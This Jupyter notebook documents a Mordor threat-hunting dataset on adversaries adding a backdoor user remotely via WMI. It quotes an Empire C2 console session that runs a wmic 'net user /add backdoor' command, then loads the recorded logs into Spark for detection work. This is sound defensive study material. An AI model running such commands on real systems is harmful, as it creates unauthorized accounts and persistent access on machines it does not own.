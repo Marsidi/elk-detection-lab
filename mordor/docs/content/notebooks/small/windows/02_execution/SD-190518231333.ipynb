{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WMIC Add User Backdoor"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518231333 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script |  |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using WMI to add a backdoor user on endpoints remotely"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: V6W3TH8Y) > shell wmic /node:IT001 process call create \"net user /add backdoor pa$$w0rd1\"\n",
    "[*] Tasked V6W3TH8Y to run TASK_SHELL\n",
    "[*] Agent V6W3TH8Y tasked with task ID 12\n",
    "(Empire: V6W3TH8Y) > Executing (Win32_Process)->Create()\n",
    "\n",
    "Method execution successful.\n",
    "\n",
    "Out Parameters:\n",
    "instance of __PARAMETERS\n",
    "{\n",
    "  ProcessId = 6580;\n",
    "  ReturnValue = 0;\n",
    "};\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: V6W3TH8Y) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
